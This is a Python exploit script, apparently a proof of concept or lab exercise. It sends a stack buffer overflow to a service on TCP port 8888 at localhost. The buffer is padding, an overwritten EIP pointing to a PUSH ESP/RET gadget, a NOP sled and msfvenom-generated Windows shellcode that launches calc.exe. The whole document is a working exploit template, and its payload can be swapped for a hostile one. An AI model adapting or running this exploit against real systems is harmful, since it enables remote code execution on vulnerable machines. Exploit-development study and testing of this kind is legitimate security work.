import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbb\x93\xdd\xf0\xe3\xdb\xca\xd9\x74\x24\xf4\x58"
payload += b"\x2b\xc9\xb1\x3e\x31\x58\x14\x03\x58\x14\x83\xc0"
payload += b"\x04\x71\x28\x0c\x0b\xf7\xd3\xed\xcc\x97\x5a\x08"
payload += b"\xfd\x97\x39\x58\xae\x27\x49\x0c\x43\xcc\x1f\xa5"
payload += b"\xd0\xa0\xb7\xca\x51\x0e\xee\xe5\x62\x22\xd2\x64"
payload += b"\xe1\x38\x07\x47\xd8\xf3\x5a\x86\x1d\xe9\x97\xda"
payload += b"\xf6\x66\x05\xcb\x73\x32\x96\x60\xcf\xd3\x9e\x95"
payload += b"\x98\xd2\x8f\x0b\x92\x8d\x0f\xad\x77\xa6\x19\xb5"
payload += b"\x94\x82\xd0\x4e\x6e\x79\xe3\x86\xbe\x82\x48\xe7"
payload += b"\x0e\x71\x90\x2f\xa8\x69\xe7\x59\xca\x14\xf0\x9d"
payload += b"\xb0\xc2\x75\x06\x12\x81\x2e\xe2\xa2\x46\xa8\x61"
payload += b"\xa8\x23\xbe\x2e\xad\xb2\x13\x45\xc9\x3f\x92\x8a"
payload += b"\x5b\x7b\xb1\x0e\x07\xd8\xd8\x17\xed\x8f\xe5\x48"
payload += b"\x4e\x70\x40\x02\x63\x65\xf9\x49\xee\x78\x8f\xf7"
payload += b"\x5c\x7a\x8f\xf7\xf0\x12\xbe\x7c\x9f\x65\x3f\x57"
payload += b"\xdb\x99\x75\xfa\x4a\x31\xd0\x6e\xcf\x5c\xe3\x44"
payload += b"\x0c\x58\x60\x6d\xed\x9f\x78\x04\xe8\xe4\x3e\xf4"
payload += b"\x80\x75\xab\xfa\x37\x76\xfe\xb8\x8d\xd4\x79\x5e"
payload += b"\x9f\x94\x09\xfc\x37\x20\x8e\x93\xa4\xbb\x12\x0b"
payload += b"\x52\x56\xf7\xa6\xd4\xc4\x68\x28\x71\x48\x19\xc9"
payload += b"\x57\x15\x9d\x68\x88\xf8\x38\x53\xab\x6f\xa7\xbd"
payload += b"\x4e\x17\x42\xe2\xa1\xd7\xa2\xd3\xf1\x39\x8a\x27"
payload += b"\xdc\x7c\xde\x67\x14\x4a\x2a\x5d\x54"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
